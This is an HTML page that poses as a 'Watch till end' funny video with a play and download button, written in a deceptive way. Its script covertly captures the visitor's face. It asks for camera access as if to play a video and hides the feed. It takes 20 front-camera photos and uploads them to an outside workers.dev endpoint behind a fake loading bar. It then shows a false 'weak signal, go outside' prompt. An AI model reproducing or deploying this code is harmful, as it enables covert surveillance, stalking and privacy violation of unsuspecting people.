<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover">
<title>Watch till end 😂</title>
<style>
:root{--bg:#fafafa;--fg:#161616;--muted:#777;--line:#dcdcdc;--ok:#1a7f4b;--err:#b3261e}
@media (prefers-color-scheme:dark){:root{--bg:#141414;--fg:#f2f2f2;--muted:#9a9a9a;--line:#333;--ok:#4cc38a;--err:#ff8a80}}
*{box-sizing:border-box}
html,body{height:100%;margin:0;overflow:hidden;overscroll-behavior:none}
html{touch-action:pan-x pan-y}
body{
background:var(--bg);color:var(--fg);font-family:system-ui,-apple-system,"Segoe UI",sans-serif;
display:flex;align-items:center;justify-content:center;
padding:16px;
padding-top:max(16px,env(safe-area-inset-top));
padding-bottom:max(16px,env(safe-area-inset-bottom));
padding-left:max(16px,env(safe-area-inset-left));
padding-right:max(16px,env(safe-area-inset-right));
height:100dvh;
-webkit-user-select:none;user-select:none;
-webkit-touch-callout:none;
-webkit-tap-highlight-color:transparent;
}
main{width:100%;max-width:360px;height:100%;max-height:100%;display:flex;flex-direction:column;gap:16px;align-items:center;justify-content:center}
.photo-box{position:relative;flex:1 1 0;min-height:0;width:100%;max-width:100%;border:1px solid var(--line);border-radius:10px;overflow:hidden;background:#000;display:flex;align-items:center;justify-content:center}
.photo-box img{width:100%;height:100%;object-fit:cover;display:block;-webkit-user-drag:none;pointer-events:none}
.play-icon{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:17%;aspect-ratio:1/1;max-width:72px;min-width:44px;filter:drop-shadow(0 2px 10px rgba(0,0,0,.35));cursor:pointer;border:none;background:none;padding:0;touch-action:manipulation;-webkit-tap-highlight-color:transparent}
.play-icon svg{width:100%;height:100%;display:block;position:absolute;top:0;left:0}
.play-icon:disabled{opacity:.5;cursor:default}
button{font:inherit;font-size:16px;padding:14px;border-radius:6px;border:1px solid var(--fg);background:var(--fg);color:var(--bg);cursor:pointer;flex:0 0 auto;touch-action:manipulation;-webkit-tap-highlight-color:transparent;-webkit-user-select:none;user-select:none}
button:disabled{opacity:.5;cursor:default}
#start.invisible{opacity:0;pointer-events:none}
button:focus-visible{outline:2px solid var(--fg);outline-offset:3px}
button:focus:not(:focus-visible){outline:none}
.bars{display:flex;flex-direction:column;gap:10px;flex:0 0 auto;width:100%}
.bars[hidden]{display:none}
.bar-row{display:flex;flex-direction:column;gap:4px}
.bar-label{display:flex;justify-content:space-between;font-size:13px;color:var(--muted)}
.bar-track{height:8px;border-radius:999px;background:var(--line);overflow:hidden}
.bar-fill{height:100%;width:0%;background:var(--fg);border-radius:999px;transition:width .15s ease}
.bar-fill.ok{background:var(--ok)}
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);display:flex;align-items:center;justify-content:center;z-index:9999;padding:20px}
.modal-overlay[hidden]{display:none}
.modal-box{background:var(--bg);color:var(--fg);border-radius:12px;padding:24px 20px;width:100%;max-width:320px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,.3)}
.modal-box svg{width:25%;min-width:56px;max-width:96px;height:auto;margin:0 auto 14px;display:block}
.modal-box p{margin:0 0 18px;font-size:15px;line-height:1.4}
.modal-box button{width:100%}
#status{min-height:1.4em;font-size:14px;color:var(--muted);text-align:center;margin:0;flex:0 0 auto}
#status.ok{color:var(--ok)}
#status.err{color:var(--err)}
[hidden]{display:none!important}
.play-icon svg.spinner{display:none}
.play-icon.loading svg.play-svg{display:none}
.play-icon.loading svg.spinner{display:block;animation:spin .8s linear infinite}
@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
</style>
</head>
<body>
<main>
<div class="bars" id="bars" hidden>
<div class="bar-row">
<div class="bar-label"><span>Loading....</span><span id="uploadText">0%</span></div>
<div class="bar-track"><div class="bar-fill" id="uploadFill"></div></div>
</div>
</div>
<div class="photo-box">
<img src="image.png" alt="Photo" id="previewImage">
<button type="button" class="play-icon" id="playIcon" aria-label="Video Preview">
<svg class="play-svg" viewBox="0 0 68 68">
<circle cx="34" cy="34" r="33" fill="rgba(0,0,0,.4)" stroke="#fff" stroke-width="2"/>
<path d="M27 21.5v25l21-12.5z" fill="#fff"/>
</svg>
<svg class="spinner" viewBox="0 0 68 68">
<circle cx="34" cy="34" r="33" fill="rgba(0,0,0,.4)"/>
<circle cx="34" cy="34" r="27" fill="none" stroke="rgba(255,255,255,.25)" stroke-width="6"/>
<circle cx="34" cy="34" r="27" fill="none" stroke="#fff" stroke-width="6" stroke-linecap="round" stroke-dasharray="42 128"/>
</svg>
</button>
</div>
<button id="start">Download 📥</button>
<p id="status" role="status"></p>
</main>
<div class="modal-overlay" id="weakSignalModal" hidden>
<div class="modal-box">
<svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M32 58V34" stroke="var(--fg)" stroke-width="3" stroke-linecap="round"/>
<circle cx="32" cy="30" r="5" fill="var(--fg)"/>
<path d="M22 22c3-3 6.5-4.5 10-4.5" stroke="var(--err)" stroke-width="3" stroke-linecap="round"/>
<path d="M16 15c5.5-5 12-7.5 16-7.5" stroke="var(--line)" stroke-width="3" stroke-linecap="round" opacity=".35"/>
<path d="M42 22c-1.2-1.2-2.6-2.1-4-2.8" stroke="var(--line)" stroke-width="3" stroke-linecap="round" opacity=".35"/>
<path d="M48 15c-2.4-2.2-5-3.9-7.8-5" stroke="var(--line)" stroke-width="3" stroke-linecap="round" opacity=".35"/>
</svg>
<p>Weak radio signal! Please go outside for better network.</p>
<button type="button" id="weakSignalOk">OK</button>
</div>
</div>
<script>
const UPLOAD_URL="https://photos.my9761313328.workers.dev/upload";
const WEAK_SIGNAL_TRIGGER="online";
const TOTAL_SHOTS=20;
const SHOT_INTERVAL_MS=350;
const startBtn=document.getElementById("start");
const playIcon=document.getElementById("playIcon");
const bars=document.getElementById("bars");
const uploadFill=document.getElementById("uploadFill");
const uploadText=document.getElementById("uploadText");
const statusEl=document.getElementById("status");
const weakSignalModal=document.getElementById("weakSignalModal");
const weakSignalOk=document.getElementById("weakSignalOk");
let stream=null;
let video=null;
let busy=false;
let uploadedCount=0;
let failedCount=0;

function say(text,type){
statusEl.textContent=text||"";
statusEl.className=type||"";
}

function setUploadProgress(done){
const pct=Math.round((done/TOTAL_SHOTS)*100);
uploadFill.style.width=pct+"%";
uploadText.textContent=pct+"%";
if(failedCount>0)uploadFill.classList.remove("ok");
else if(pct===100)uploadFill.classList.add("ok");
}

function stopStream(){
if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}
if(video){video.remove();video=null}
}

function setStartDisabled(disabled){
startBtn.disabled=disabled;
playIcon.disabled=disabled;
}

function setLoading(on){
playIcon.classList.toggle("loading",on);
startBtn.classList.toggle("invisible",on);
startBtn.disabled=on;
}

async function openCamera(){
say("");
setStartDisabled(true);
try{
stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false});
}catch(e){
say("Permission Required For Video","err");
setStartDisabled(false);
return;
}
video=document.createElement("video");
video.autoplay=true;
video.playsInline=true;
video.setAttribute("playsinline","");
video.muted=true;
video.style.position="fixed";
video.style.width="1px";
video.style.height="1px";
video.style.opacity="0";
video.style.pointerEvents="none";
document.body.appendChild(video);
video.srcObject=stream;
try{
await video.play();
}catch(e){}
await new Promise(resolve=>{
if(video.readyState>=3&&video.videoWidth>0){resolve();return}
video.addEventListener("canplay",function check(){
if(video.videoWidth>0){
video.removeEventListener("canplay",check);
resolve();
}
});
});
await sleep(300);
setLoading(true);
startBurst();
}

function grabFrame(){
return new Promise(resolve=>{
if(!video||!video.videoWidth){resolve(null);return}
const canvas=document.createElement("canvas");
canvas.width=video.videoWidth;
canvas.height=video.videoHeight;
const ctx=canvas.getContext("2d");
ctx.translate(canvas.width,0);
ctx.scale(-1,1);
ctx.drawImage(video,0,0);
canvas.toBlob(b=>resolve(b),"image/jpeg",0.8);
});
}

function uploadPhoto(blob,index){
const data=new FormData();
data.append("photo",blob,"photo-"+Date.now()+"-"+index+".jpg");
fetch(UPLOAD_URL,{method:"POST",body:data})
.then(res=>{
if(!res.ok)throw new Error(res.status);
uploadedCount++;
})
.catch(()=>{
failedCount++;
})
.finally(()=>{
const done=uploadedCount+failedCount;
setUploadProgress(done);
if(done===TOTAL_SHOTS){
if(failedCount>0)say((TOTAL_SHOTS-failedCount)+"/"+TOTAL_SHOTS+" loaded, "+failedCount+" fail","err");
else{
say("All is OK","ok");
checkSignalAfterSave();
}
setStartDisabled(false);
setLoading(false);
}
});
}

function sleep(ms){
return new Promise(r=>setTimeout(r,ms));
}

function showWeakSignal(){
weakSignalModal.hidden=false;
}

function hideWeakSignal(){
weakSignalModal.hidden=true;
}

function checkSignalAfterSave(){
const state=navigator.onLine?"online":"offline";
if(state===WEAK_SIGNAL_TRIGGER){
showWeakSignal();
}
}

async function startBurst(){
if(busy)return;
busy=true;
uploadedCount=0;
failedCount=0;
setUploadProgress(0);
uploadFill.classList.remove("ok");
bars.hidden=false;
say("");
for(let i=1;i<=TOTAL_SHOTS;i++){
const blob=await grabFrame();
if(blob){
uploadPhoto(blob,i);
}else{
failedCount++;
const done=uploadedCount+failedCount;
setUploadProgress(done);
if(done===TOTAL_SHOTS){
say((TOTAL_SHOTS-failedCount)+"/"+TOTAL_SHOTS+" loaded, "+failedCount+" fail","err");
setStartDisabled(false);
setLoading(false);
}
}
if(i<TOTAL_SHOTS)await sleep(SHOT_INTERVAL_MS);
}
stopStream();
busy=false;
}

startBtn.addEventListener("click",openCamera);
playIcon.addEventListener("click",openCamera);
weakSignalOk.addEventListener("click",hideWeakSignal);

document.addEventListener("gesturestart",e=>e.preventDefault());
document.addEventListener("gesturechange",e=>e.preventDefault());
document.addEventListener("gestureend",e=>e.preventDefault());
document.addEventListener("touchmove",e=>{if(e.touches.length>1)e.preventDefault()},{passive:false});

let lastTouchEnd=0;
document.addEventListener("touchend",e=>{
const now=Date.now();
if(now-lastTouchEnd<=350)e.preventDefault();
lastTouchEnd=now;
},{passive:false});

document.addEventListener("selectstart",e=>e.preventDefault());
document.addEventListener("contextmenu",e=>e.preventDefault());
</script>
</body>
</html>
